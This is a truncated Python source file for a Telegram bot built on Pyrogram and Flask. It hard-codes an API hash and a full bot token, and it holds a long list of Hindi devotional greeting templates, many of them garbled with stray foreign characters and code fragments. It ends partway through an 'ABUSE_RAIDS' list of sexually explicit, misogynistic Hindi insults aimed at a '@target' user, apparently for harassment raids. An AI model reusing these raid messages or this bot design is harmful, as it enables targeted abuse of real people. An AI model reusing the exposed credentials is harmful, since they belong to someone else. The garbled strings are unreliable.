import os
import asyncio
import random
from pyrogram import Client, filters, errors, handlers
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "xᴇɴᴏ Bᴏᴛ Is Oɴʟɪɴᴇ! ✨"

def run_web():
    app.run(host='0.0.0.0', port=8080)

# --- CONFIGURATION ---
API_ID = 31980984
API_HASH = "a61358dd3cd8c3a56cd53d9ddd8a0c67"
BOT_TOKEN = "8303588999:AAEnHHO7ULTHA5IJKJAAGV8WEXSnV5dhz_M"
LOG_GROUP = -1003867805165 
START_IMG = "https://graph.org/file/422440e09d466500f2c93-953253772b0d8d2bfc.jpg"

bot = Client("XenoGen", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_data = {}
active_tasks = {}
running_ubots = {}

# --- BUTTONS ---
main_buttons = InlineKeyboardMarkup([
    [InlineKeyboardButton("❂ 𝐔𝐩𝐝𝐚𝐭𝐞 ❂", url="https://t.me/radhesupport"),
     InlineKeyboardButton("❂ 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ❂", url="https://t.me/radhesupport")],
    [InlineKeyboardButton("❂ 𝐂𝐥𝐨𝐬𝐞 ❂", callback_data="close")]
])

# --- DYNAMIC LISTS (FIXED MENTIONS) ---
GOD_CHATS = [
    "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention} 𝐉𝐢, ᴘʀᴀʙʜᴜ ᴋɪ ᴋʀɪᴘᴀ ᴀᴀᴘ ᴘᴀʀ ʙᴀɴɪ ʀᴀʜᴇ! 🙏",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐊𝐫𝐢𝐬𝐡𝐧𝐚 {mention}, ᴘʀᴀʙʜᴜ ᴀᴀᴘᴋᴀ ᴅɪɴ sʜᴜʙʜ ᴋᴀʀᴇɪɴ! 🪈",
    "ʜᴀʀ ʜᴀʀ ᴍᴀʜᴀᴅᴇᴠ {mention} 𝘑𝘪, 𝔅𝔥𝔬𝔩𝔢𝔫𝔞𝔱𝔥 ᴀᴀᴘᴋɪ ʀᴀᴋsʜᴀ ᴋᴀʀᴇɪɴ! 🔱",
    "𝘑𝘢𝘪 𝘚𝘩𝘳𝘦e 𝘙𝘢𝘮 {mention}, 𝖍𝖆𝖓𝖚𝖒𝖆𝖓 𝖏𝖎 ᴀᴀᴘᴋᴏ ʙᴀʟ ʙᴜᴅᴅʜɪ ᴅᴇɪɴ! 🚩",
    "𝖏𝖆𝖎 𝖒𝖆𝖆 𝖉𝖚𝖗𝖌𝖆 {mention} 𝐉𝐢, ᴍᴀᴀ ᴀᴀᴘᴋᴀ ᴋᴀʟʏᴀɴ ᴋᴀʀᴇɪɴ! 🌸",
    "ᴊᴀɪ sʜʀᴇᴇ sʜʏᴀᴍ {mention}, 𝘉𝘢𝘣𝘢 𝘚𝘩𝘺𝘢𝘮 ʜᴀᴍᴀʀᴇ ʜᴀʀᴇ ᴋᴇ sᴀʜᴀʀᴇ! 🎈",
    "𝙾𝚖 𝙽𝚊𝚖𝚊𝚑 𝚂𝚑𝚒𝐯𝚊𝚢 {mention} ᴊɪ, 𝐌𝐚𝐡𝐚𝐤𝐚𝐥 sᴀᴅᴀ sᴀʜᴀʏ ʜᴏɴ! 🕉️",
    "𝕊𝕒𝕚 ℝ𝕒𝕞 {mention}, sᴀʙᴋᴀ ᴍᴀʟɪᴋ ᴇᴋ, sᴀʙ ᴘᴀʀ ᴋʀɪᴘᴀ ʙᴀɴɪ ʀᴀʜᴇ! 🕊️",
    "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 𝔊𝔞𝔫𝔢𝔰𝔥 {mention} 𝙹𝚒, sᴀʀᴇ ᴠɪɢʜɴᴀ ᴅᴏᴏʀ ʜᴏ ᴀᴀᴘᴋᴇ! 🍯",
    "ʜᴀʀᴇ ᴋʀɪsʜɴᴀ {mention}, 𝒫𝓇𝒶𝒷𝒽𝓊 ℬ𝒽𝒶𝓀𝓉𝒾 ᴍᴇ ʜɪ sᴀʙsᴇ ʙᴀᴅᴀ sᴜᴋʜ ʜᴀɪ! 🪷",
    "𝐉𝐚𝐢 𝐁𝐚𝐣𝐫𝐚𝐧𝐠𝐛𝐚𝐥𝐢 {mention} ᴊɪ, sᴀɴᴋᴀᴛ ᴍᴏᴄʜᴀɴ 𝔎𝔯𝔦𝔭𝔞 𝔎𝔞𝔯𝔬! 🐾",
    "sʜʀᴇᴇ ʜᴀʀɪ ᴠɪsʜɴᴜ {mention}, 𝙹𝚊𝚒 𝙽𝚊𝚛𝚊𝚢𝚊𝚗𝚊 sᴜᴋʜ sᴀᴍʀɪᴅᴅʜɪ ᴀᴀʏᴇ! 🔱",
    "𝘑𝘢𝘪 𝘔𝘢𝘢 𝘓𝘢𝘬𝓼𝘩𝘮𝘪 {mention} 𝖏𝖎, ʜᴀᴍᴇsʜᴀ 𝕭𝖆𝖗𝖐𝖆𝖙 ʙᴀɴɪ ʀᴀʜᴇ! 💰",
    "ℝ𝕒𝕕𝕙𝕖 ℝ𝕒𝕕𝕙𝕖 {mention}, ᴋᴀɴʜᴀ ᴊɪ ᴋɪ 𝓫𝓪𝓷𝓼𝓾𝓻𝓲 ᴍɪᴛʜᴀs ʙʜᴀʀ ᴅᴇ! 🎶",
    "ᴊᴀɪ ᴍᴀᴀ sᴀʀᴀsᴡᴀᴛɪ {mention} 𝘑𝘪, 𝖘𝖆𝖉𝖇𝖚𝖉𝖉𝖍𝖎 ᴀᴜʀ ɢʏᴀɴ ᴍɪʟᴇ! 📚",
    "𝖏𝖆𝖎 𝖘𝖍𝖗𝖊𝖊 𝖐𝖗𝖎𝖘𝖍𝖓𝖆 {mention} ᴊɪ, 𝐑𝐚𝐝𝐡𝐞 𝐑𝐚𝐝𝐡𝐞 𝐆𝐨𝐯𝐢𝐧𝐝𝐚! 🦚",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐃𝐮𝐫𝐠𝐚 {mention}, 𝔐𝔞𝔞 𝔞𝔞𝔭𝔨𝔞 ᴋᴀʟʏᴀɴ ᴋᴀʀᴇɪɴ! 🌺",
    "ʜᴀʀ ʜᴀʀ ᴍᴀʜᴀᴅᴇᴠ {mention} 𝐉𝐢, 𝙾𝚖 𝙽𝚊𝚖𝚊𝚑 𝚂𝚑𝚒𝐯𝚊𝚢! 💎",
    "𝕁𝕒𝕚 𝔹𝕒𝕛𝕣𝕒𝕟𝕘𝕓𝕒𝕝𝕚 {mention}, 𝘚𝘢𝘯𝘬𝘢𝘵 𝘔𝘰𝘤𝘩𝘢𝘯 𝙺𝚛𝚒𝚙𝚊 𝙺𝚊𝚛𝚘! 🦍",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐑𝐚𝐦 {mention} 𝔍𝔦, 𝘚𝘪𝘵𝘢 𝘙𝘢𝘮 ʜᴀɴᴜᴍᴀɴ! 🏹",
    "ᴊᴀɪ sʜʀᴇᴇ sʜʏᴀᴍ {mention}, 𝔎𝔥𝔞𝔱 vapor 𝔑𝔞𝔯𝔢𝔰𝔥 𝖪𝖎 𝕵𝖆𝖎! 🚩",
    "𝙾𝚖 𝙶𝚊𝚗 𝙶𝚊𝚗𝚊𝚙𝚊𝚝𝚊𝚢𝚎 𝙽𝚊𝚖𝚊𝚑 {mention}, 𝕊𝕙𝕦𝕓𝕙 𝕃𝕒𝕓𝕙 ℍ𝕠! 🪵",
    "ʜᴀʀᴇ ᴋʀɪsʜɴᴀ ʜᴀʀᴇ ʀᴀᴍ {mention}, 𝑷𝒓𝒂𝒃𝒉𝒖 𝑵𝒂𝒂𝒎 ʜɪ sᴀᴛʏᴀ ʜᴀɪ! 🕯️",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐋𝐚𝐤𝐬𝐡𝐦𝐢 {mention} 𝙹𝚒, 𝖉𝖍𝖆𝖓 𝖉𝖍𝖆𝖓𝖞𝖆 sᴇ ʙʜᴀʀᴘᴏᴏʀ ʜᴏ! 👑",
    "𝖘𝖆𝖎 𝖗𝖆𝖒 {mention}, 𝘚𝘩𝘳𝘢𝘥𝘥𝘩𝘢 𝘈𝘶𝘳 𝘚𝘢𝘉𝘶𝘳𝘪 ʀᴀᴋʜᴏ! 🌻",
    "𝔍𝔞𝔦 𝔐𝔞𝔞 𝔎𝔞𝔩𝔦 {mention} 𝐉𝐢, sᴀʀᴇ ᴋᴀsʜᴛ 𝖉𝖔𝖔𝖗 𝖍𝖔𝖓! 🗡️",
    "𝕊𝕩𝕣𝕖𝕖 𝕂𝕣𝕩𝕤𝕙𝕟𝕒 {mention}, 𝘊𝘩𝘢𝘳𝘢𝘯 𝘒𝘢𝘮𝘢𝘭 sᴀᴅᴀ ᴀɴᴀɴᴅ ʀᴀᱦᴇ! 🌊",
    "𝐌𝐚𝐡𝐚𝐤𝐚𝐥 𝐁𝐡𝐚𝐤𝐭 {mention} ᴊɪ, 𝔎𝔞𝔞𝔩 𝔘𝔰𝔨𝔞 𝔎𝔶𝔞 𝔎𝔞𝔯𝔢! 💀",
    "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴅʜᴇ {mention}, 𝕭𝖍𝖆𝖐𝖙𝖎 𝕸𝖊 𝕳𝖎 𝕾𝖍𝖆𝖐𝖙𝖎 𝕳𝖆𝖎! 🎐",
    "𝘛𝘴𝘩𝘸𝘢𝘳 𝘒𝘪 𝘒𝘳错𝘗𝘢 {mention} 𝕁𝕚, ʜᴀᴍᴇsʜᴀ ᴀᴀᴘᴋᴇ sᴀᴀᴛʜ ʜᴀɪ! ✨",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐑𝐚𝐦 {mention} ᴊɪ, 𝔖𝔦𝔱𝔞 ℜ𝔞𝔪 𝘉𝘢𝘫𝘳𝘢𝘯𝘨𝘣𝘢𝘭𝘪! ☀️",
    "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}, 𝕊𝕙𝕣𝕖𝕖 ℝ𝕒𝕞 ℂ𝕙𝕒𝕣𝕒𝕟 𝕂𝕒𝕞𝕒𝕝! 🪷",
    "𝖋𝖒 𝕹𝖆𝖒𝖆𝖍 𝕾𝖍𝖎𝖛𝖆𝖞 {mention} 𝙹𝚒, 𝘉𝘩𝘰𝘭𝘦𝘎𝘢𝘵𝘩 sᴀᴅᴀ sᴀʜᴀʏ! 🔔",
    "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 𝔖𝔥𝔶𝔞𝔪 {mention}, ʜᴀʀᴇ ᴋᴇ sᴀʜᴀʀᴇ 𝐉𝐚𝐢 𝐁𝐚𝐛𝐚 𝐒𝐡𝐲𝐚𝐦! 🍀",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐃𝐮𝐫𝐠𝐚 {mention} ᴊɪ, 𝖘𝖍𝖆𝖐𝖙𝖎 𝖆𝖚𝖗 𝖇𝖍𝖆𝖐𝖙𝖎 ᴍɪʟᴇ! 🦁",
    "ᴊᴀɪ ʙᴀᴊʀᴀɴɢʙᴀʟɪ {mention}, 𝘗𝘢𝘸𝘢𝘯 𝘚𝘶𝘵𝘢 𝕳𝖆𝖓𝖚𝖒𝖆𝖓 𝕶𝖎 𝕵𝖆𝖎! 💪",
    "ʜᴀʀᴇ ᴋʀɪsʜɴᴀ {mention} 𝐉𝐢, 𝙺𝚊𝚗𝚑𝚊 𝙹𝚒 𝙺𝚒 𝙻𝚎𝚎𝚕𝚊 𝘕𝘺𝘢𝘳𝘪! 🍃",
    "𝕊𝕒𝕚 ℝ𝕒𝕞 {mention}, sᴀʙᴋᴀ 𝔅𝔥𝔞𝔩𝔞 𝔎𝔞𝔯𝔢𝔦𝔫 𝔓𝔯𝔞𝔟𝔥𝔲! 🕊️",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐆𝐚𝐧𝐞𝐬𝐡 {mention} 𝔍𝔦, 𝘙𝘪𝘥𝘥𝘩𝘪 𝘚𝘪𝘥𝘥𝘩𝘪 𝘒𝘦 𝖉𝖆𝖙𝖆! 🍯",
    "𝖏𝖆𝖎 𝖒𝖆𝖆 𝖑𝖆𝖐𝖘𝖍𝖒𝖎 {mention}, 𝙂𝙝𝙖𝙧 𝙈𝙚 𝕭𝖆𝖗𝖐𝖆𝖙 𝕳𝖔! 💎",
    "ʜᴀʀ ʜᴀʀ ᴍᴀʜᴀᴅᴇᴠ {mention} 𝕁𝕚, 𝔅𝔥𝔬𝔩𝔢 𝔅𝔞𝔟𝔞 𝔎𝔦 𝔍𝔞𝔦! 🪵",
    "𝘚𝘩𝘳𝘦e 𝘏𝘢𝘳𝘪 𝘝联𝘴𝘩𝘯𝘶 {mention}, 𝓝𝓪𝓻𝓪𝔂𝓪𝓷 𝓝𝓪𝓻𝓪𝔂𝓪𝓷! 🔱",
    "ʀᴀᴅʜᴇ sʜʏᴀᴍ {mention} 𝙹𝚒, 𝕲𝖔𝖕𝖆𝖑 𝕲𝖔𝖛𝖎𝖓𝖉 𝕳𝖆𝖗𝖊! 🎶",
    "𝕀𝕤𝕙𝕨𝕒𝕣 ℙ𝕒𝕣 𝕐𝕒𝕢𝕖𝕖𝕟 {mention}, sᴀʙ 𝖆𝖈𝖍𝖍𝖆 𝖍𝖔𝖌𝖆! 🔮",
    "𝔎𝔞𝔯𝔪𝔞 ℑ𝔰 𝔊𝔬𝔡 {mention} 𝐉𝐢, ᴀᴄʜᴇ ᴋᴀʀᴍ 𝗄𝖺𝗋𝗍𝖾 𝗋𝖺𝗁𝗈! 📜",
    "ᴊᴀɪ sʜʀᴇᴇ ᴋʀɪsʜɴᴀ {mention} 𝖏𝖎, 𝔨𝔞𝔫𝔥𝔞 𝔍𝔦 𝔎𝔦 𝔎𝔯𝔦𝔭𝔞 ℌ𝔬! ✨",
    "𝐇𝐚𝐫 𝐇𝐚𝐫 𝐌𝐚𝐡𝐚𝐝𝐞𝐯 {mention}, 𝖇𝖍𝖔𝖑𝖊𝖓𝖆𝖙𝖍 sᴀʙ ᴛʜᴇᴇᴋ 𝗄𝖺𝗋𝖾𝗇𝗀𝖾! 🌪️",
    "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 ℜ𝔞𝔪 {mention} ᴊɪ, 𝖗𝖆𝖌𝖍𝖚𝖓𝖆𝖓𝖉𝖆𝖓 sᴀʀᴋᴀʀ ᴋɪ ᴊᴀɪ! ⚡",
    "𝘑𝘢𝘪 𝘉𝘢𝘫𝘳ᴀ𝘯𝘨𝘣𝘢𝘭𝘪 {mention}, sᴀɴᴋᴀᴛ ᴋᴀᴛᴇ 𝖒𝖎𝖙𝖊 sᴀʙ sʜᴀᴋᴛɪ! 🥊",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐃𝐮𝐫𝐠𝐚 {mention} 𝙹𝚒, ᴍᴀᴀ sᴀᴅᴀ 𝖘𝖆𝖍𝖆𝖞 𝖗𝖆𝖍𝖊! 🌸",
    "𝖋𝖒 𝕹𝖆𝖒𝖆𝖍 𝕾𝖍𝖎𝖛𝖆𝖞 {mention}, 𝐌𝐚𝐡𝐚𝐤𝐚𝐥 ᴋᴇ ʙʜᴀᴋᴛ 𝔥𝔞𝔦𝔫! 🔱",
    "ʀᴀᴅʜᴇ sʜʏᴀᴍ {mention} 𝐉𝐢, 𝔥𝔞𝔯𝔢 𝔨𝔢 𝔰𝔞𝔥𝔞𝔯𝔢 𝔟𝔞𝔟𝔞 𝔰𝔥𝔶𝔞𝔪! 🎈",
    "𝕊𝕒𝕚 ℝ𝕒𝕞 {mention}, sᴀʙᴋᴀ 𝖒𝖆𝖑𝖎𝖐 𝖊𝖐 𝖍𝖆𝖎 𝖏𝖎! 🕊️",
    "ᴊᴀɪ sʜʀᴇᴇ ɢᴀɴᴇsʜ {mention} 𝔍𝔦, 𝘝𝘪𝘨𝘩𝘯𝘢𝘩𝘢𝘳𝘵𝘢 𝘒𝘪 𝘑𝘢𝘪! 👑",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐋𝐚𝐤𝐬𝐡𝐦𝐢 {mention}, sᴜᴋʜ sᴀᴍʀɪᴅᴅʜɪ 𝙱𝚊𝚜𝚎𝚍! 💰",
    "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention} 𝙹𝚒, 𝔓𝔯𝔞𝔟𝔥𝔲 𝔓𝔶𝔞𝔞𝔯 𝔟𝔞𝔫𝔞𝔶𝔢 𝔯𝔞𝔨𝔥𝔢𝔦𝔫! 🙏",
    "𝘧𝘢𝘳放 𝘒𝘳𝘪𝘴𝘩𝘯𝘢 {mention}, 𝖍𝖆𝖗𝖊 𝖗𝖆𝖒 𝖇𝖍𝖆𝖏𝖔 ʜᴀᴍᴇsʜᴀ! 🪈",
    "𝕁𝕒𝕚 𝕊𝕙𝕣𝕖e ℍ𝕒𝕣𝕚 {mention} ᴊɪ, 𝓝𝓪𝓻𝓪𝔂𝓪𝓷 𝓚𝓻𝓲𝓿𝓪! 🕉️",
    "𝔗𝔰𝔥𝔴𝔞𝔯 𝔅𝔥𝔞𝔯𝔬𝔰𝔞 {mention}, 𝘑𝘰 𝘏𝘰𝘵𝘢 𝘏𝘢𝘪 𝔄𝔠𝔥𝔢 𝔎𝔢 𝔏𝔦𝔶𝔢! 🔮",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐊𝐚𝐥𝐢 {mention} 𝖏𝖎, ʙʜᴀᴋᴛᴏɴ ᴋɪ 𝖗𝖆𝖐𝖘𝖍𝖆 𝖐𝖆𝖗𝖔! 🗡️",
    "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴍ {mention} 𝐉𝐢, 𝙺𝚊𝚛𝚖𝚊 𝚑𝚒 𝖯𝖔𝖔𝖏𝖆 𝖍𝖆𝖎! 📜",
    "𝘙𝘢𝘥𝘩𝘦 𝘙𝘢𝘥𝘩𝘦 {mention}, 𝖋𝖘𝖍𝖜𝖆𝖗 𝖕𝖆𝖗 𝖇𝖍𝖆𝖗𝖔𝖘𝖆 𝖗𝖆𝖐𝖍𝖔! 🕊️",
    "𝖋𝖒 𝕹𝖆𝖒𝖆𝖍 𝕾𝖍𝖎𝖛𝖆𝖞 {mention} 𝙹𝚒, 𝐌𝐚𝐡𝐚𝐤𝐚𝐥 sᴀʀᴠᴏᴘᴀʀɪ! 🔔",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐋𝐚𝐤𝐬𝐡𝐦𝐢 {mention}, 𝔊𝔥𝔞𝔯 𝔪𝔢 sᴜᴋʜ-sᴀᴍʀɪᴅᴅʜɪ 𝔄𝔞𝔶𝔢! 💎",
    "ʀᴀᴅʜᴇ ᴋʀɪsʜɴᴀ {mention} 𝕁𝕚, 𝘎𝘰𝘱𝘢𝘭 𝘎𝘰𝘝𝘪𝘯𝘥𝘢! 🪈",
    "𝔍𝔞𝔦 𝔔𝔞𝔞 𝔇𝔲𝔯𝔤𝔞 {mention}, ᴍᴀᴀ ᴀᴀᴘᴋᴏ 𝖘𝖍𝖆𝖐𝖙𝖎 𝖉𝖊𝖏𝖓! 🌸",
    "𝐉𝐚𝐢 𝐁𝐚𝐣𝐫𝐚𝐧𝐠𝐛𝐚𝐥𝐢 {mention} 𝙹𝚒, 𝕳𝖆𝖓𝖚𝖒𝖆𝖓 𝕵𝖎 𝕶𝖎 𝕵𝖆𝖎! 🐾",
    "ᴊᴀɪ sʜʀᴇᴇ sʜʏᴀᴍ {mention}, 𝙺𝚑𝚊𝚝𝚞 𝖶𝚊𝚕𝚎 𝙱𝚊𝚋𝚊 𝔎𝔦 𝔍𝔞𝔦! 🚩",
    "𝕊𝕒𝕚 ℝ𝕒𝕞 {mention} 𝔍𝔦, sᴀʙᴋᴀ 𝐌𝐚𝐥𝐢𝐤 𝙴𝚔 𝖧𝚊𝚒! 🕯️",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐆𝐚𝐧𝐞𝐬𝐡 {mention}, 𝔅𝔞𝔭𝔭𝔞 𝔐𝔬𝔯𝔢𝔶𝔞! 🍯",
    "ʜᴀʀ ʜᴀʀ ᴍᴀʜᴀᴅᴇᴠ {mention} 𝙹𝚒, 𝘉𝘩𝘰𝘭𝘦𝘎𝘢𝘵𝘩 𝕶𝖗𝖎𝖕𝖆! 🔱",
    "𝖍𝖆𝖗𝖊 𝖐𝖗𝖎𝖘𝖍𝖓𝖆 {mention}, 𝘗𝘳𝘢𝘉𝘩𝘶 𝘉𝘩𝘢𝘬𝘵𝘪 ᴍᴇ ᴍᴀɴ ʟᴀɢᴀᴏ! 🪷",
    "𝔖𝔥𝔯𝔢𝔢 ℌ𝔞𝔯𝔦 𝔙𝔦𝔰𝔥𝔫𝔲 {mention} 𝕁𝕚, 𝙾𝚖 𝙾𝚖𝚘 𝙽𝚊𝚛𝚊𝚢𝚊𝚗𝚊! 🕉️",
    "𝖋𝖘𝖍𝖜𝖆𝖗  TASK 𝕾𝖆𝖙𝖞𝖆 𝕳𝖆𝖎 {mention}, 𝘉𝘩𝘢𝘨𝘸𝘢𝘯 sᴀʙ 𝔡𝔢𝔨𝔥 𝔯𝔞𝔥𝔢! 🌍",
    "𝐉𝐚𝐢 𝐌𝐚𝐚 𝐒𝐚𝐫𝐚𝐬𝐰𝐚𝐭𝐢 {mention} ᴊɪ, 𝔊𝔶𝔞𝔫 𝔇𝔞𝔞𝔫 𝔇𝔬 𝔐𝔞𝔞! 📚",
    "𝕁𝕒设置 𝕊𝕙... " "𝕁𝕒本地 𝕊𝕙𝕣𝕖e 𝕂𝕣𝕩𝕤𝕙𝕟𝕒 {mention} 𝕁𝕚, 𝖕𝖗𝖆𝖇𝖍𝖚 𝖇𝖍𝖆𝖐𝖙𝖎 ᴍᴇ ʜɪ sᴜᴋʜ ʜᴀɪ! 🦚",
    "ʜᴀʀ ʜᴀʀ ᴍᴀʜᴀᴅᴇᴠ {mention}, 𝐁𝐡𝐨𝐥𝐞 𝐁𝐚𝐛𝐚 𝔎𝔦 𝔍𝔞𝔦! 🔱",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐑𝐚𝐦 {mention} 𝕁𝕚, 𝘚𝘪𝘵𝘢 𝘙𝘢𝘮 𝕶𝖗𝖎𝖕𝖆! 🚩",
    "𝖘𝖆𝖎 𝖗𝖆𝖒 {mention} ᴊɪ, sᴀʙᴋᴀ 𝕄𝕒𝕝𝕩𝕜 𝔼𝕜! 🕊️",
    "𝔍𝔞𝔦 𝔔𝔞𝔞 𝔇𝔲𝔯𝔤𝔞 {mention} 𝔍𝔦, ᴍᴀᴀ 𝕬𝖘𝖍𝖎𝖗𝖜𝖆𝖉 𝕯𝖔! 🌸",
    "ᴊᴀɪ ʙᴀᴊʀᴀɴɢʙᴀʟɪ {mention}, 𝕊𝕒𝕟𝕜𝕒𝕥 𝕄𝕠𝕔𝕙𝕒𝕟 𝙺𝚛𝚒𝚙𝚊! 💪",
    "𝘛𝘮 𝘕𝘢𝘮𝘢𝘩 𝘚𝘩𝘪𝘷𝘢𝘺 {mention} 𝐉𝐢, 𝔐𝔞𝔥𝔞𝔨𝔞𝔩 𝕶𝖗e𝖕𝖆! 🕉️",
    "𝖏𝖆𝖎 𝖘𝖍𝖗𝖊e 𝖘𝖍𝖞𝖆𝖒 {mention}, ʙᴀʙᴀ sʜʏᴀᴍ 𝕳𝖆𝖒𝖆𝖗𝖊! 🎈",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐆𝐚𝐧𝐞𝐬𝐡 {mention} 𝕁𝕚, 𝘝𝘪𝘨𝘩𝘯𝘢𝘩𝘢variable! 🍯",
    "ʀᴀᴅʜᴇ sʜʏᴀᴍ {mention}, 𝔊𝔥𝔞𝔯 𝔐𝔢 𝔏𝔞𝔵𝔪𝔦 𝔄𝔞𝔶𝔢! 💰",
    "ℝ𝕒𝕕𝕙𝕖 ℝ𝕒𝕕𝕙𝕖 {mention} 𝕁𝕚, 𝖘𝖍𝖞𝖆𝖒 𝖏𝖎 𝖐𝖎 𝖏𝖆𝖎! 🙏",
    "ʜᴀʀᴇ ᴋʀɪsʜɴᴀ {mention}, 𝘗𝘳𝘢𝘣𝘩𝘶 𝘕𝘢𝘢𝘮 𝕊𝕩𝕩𝕞𝕣𝕒𝕟! 🪈",
    "𝔖𝔥𝔯𝔢𝔢 ℌ𝔞𝔯𝔦 𝔙𝔦𝔰𝔥𝔫𝔲 {mention} ᴊɪ, 𝓝𝓪𝓻𝓪𝔂𝓪𝓷 𝓝𝓪𝓻𝓪𝔂𝓪𝓷! 👑",
    "𝐉𝐚𝐢 𝐒𝐡𝐫𝐞e 𝐑𝐚𝐦 {mention}, 𝖋𝖘𝖍𝖜𝖆𝖗 𝖕𝖆𝖗 𝕿𝖆𝖖𝖊𝖊𝖓 𝖗𝖆𝖌𝖍𝖚! 🔮",
    "𝘑𝘢𝘪 𝘔𝘢𝘢 𝘚𝘢𝘳𝘢𝓼𝘸𝘢𝘵𝘪 {mention} 𝕁𝕚, 𝔙𝔶𝔡𝔶𝔞 𝔇𝔢𝔳𝔦! 📚",
    "𝔍𝔞𝔦 𝔖𝔥..." "𝔍𝔞𝔦 𝔖𝔥... " "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 𝔎𝔯𝔦𝔰𝔥𝔫𝔞 {mention} 𝔍𝔦, 𝘙𝘢𝘥𝘩𝘦 𝘎𝘰𝘷𝘪𝘯𝘥𝘢! 🪈",
    "ℌ𝔞𝔯 ℌ𝔞𝔯 𝔐𝔞𝔥𝔞𝔡𝔢𝔳 {mention}, 𝔒𝔪 𝔑𝔞𝔪𝔞𝔥 𝔖𝔥𝔦𝔳𝔞𝔶! 🔱",
    "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 ℜ𝔞𝔪 {mention} 𝐉𝐢, 𝕊𝕚𝕥𝕒 ℝ𝕒𝕞 𝕵𝖆𝖎! 🚩",
    "𝖏𝖆𝖎 𝖘𝖆𝖎 𝖗𝖆𝖒 {mention}, sᴀʙᴋᴀ 𝓜𝓪𝓵𝓲𝓴 𝓔𝓴 𝓗𝓪𝓲! 🕊️",
    "Ꮣ𝓪𝓲 𝓜𝓪𝓪 𝓓𝓾𝓻𝓰𝓪 {mention} Ꮣ𝓲, ᴋᴀʟʏᴀɴ ᴋᴀʀᴏ ᴍᴀᴀ! 🌸",
    "𝐉𝐚𝐢 𝐁𝐚𝐣𝐫𝐚𝐧𝐠𝐛𝐚𝐥𝐢 {mention}, 𝖧𝖆𝖓𝖚𝖒𝖆𝖓 𝕶𝖎 𝕵𝖆𝖎! 💪",
    "𝓞𝓶 𝓝𝓪𝓶𝓪𝓱 𝓢𝓱𝓿𝓪𝔂 {mention} Ꮣ𝓲, 𝔅𝔥𝔬𝔩𝔢𝔫𝔞𝔱𝔥! 🕉️",
    "𝔍𝔞𝔦 𝔖𝔥𝔯𝔢𝔢 𝔖𝔥𝔶𝔞𝔪 {mention}, ʜᴀʀᴇ ᴋᴇ sᴀʜᴀʀᴇ ʙᴀʙᴀ sʜʏᴀᴍ! 🎈",
    "𝓡𝓪𝓭𝓱𝓮 𝓡𝓪𝓭𝓱𝓮 {mention} Ꮣ𝓲, 𝘒𝘳𝘪𝘴𝘩𝘯𝘢 𝘒𝘳𝘪𝘱𝘢 sᴀᴅᴀ! 🙏",
    "𝔊𝔬𝔡 𝔅𝔩𝔢𝔰𝔰 𝔜𝔬𝔲 {mention}, 𝖕𝖗𝖆𝖇𝖍𝖚 ʜᴀᴍᴇsʜᴀ ᴋʜᴜsʜ ʀᴀᴋʜᴇɪɴ! ✨"
]


ABUSE_RAIDS = [
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ @target ᴋᴀ ʟᴀɴᴅ 👊",
    "ɴɪᴋᴀʟ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ɴᴀʜɪ! 🔥",
    "ᴀʙᴇʏ sᴀᴀʟᴇ @target ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ᴘᴇʟᴀ 🥵",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ @target ᴀᴜʀ ✘ᴇɴᴏ sᴇ ʟᴀᴅᴀɪ? 🤬",
    "ᴄʜᴜᴘ ᴋᴀʀ @target ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ! 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴏsᴅᴀ @target ᴋᴜᴛᴛᴇ ᴋɪ ᴀᴜʟᴀᴅ ☠️",
    "ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ʙᴇᴛᴀ 💥",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ʜᴀᴛʜᴏᴅᴀ ᴍᴀʀᴜɴɢᴀ @target 👋",
    "ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ᴋᴜᴛᴛᴇ ᴋᴇ ᴘɪʟʟᴇ @target ☠️",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ʙᴇᴄʜ ᴅᴜɴɢᴀ ʙᴀᴢᴀʀ ᴍᴇ @target 💸",
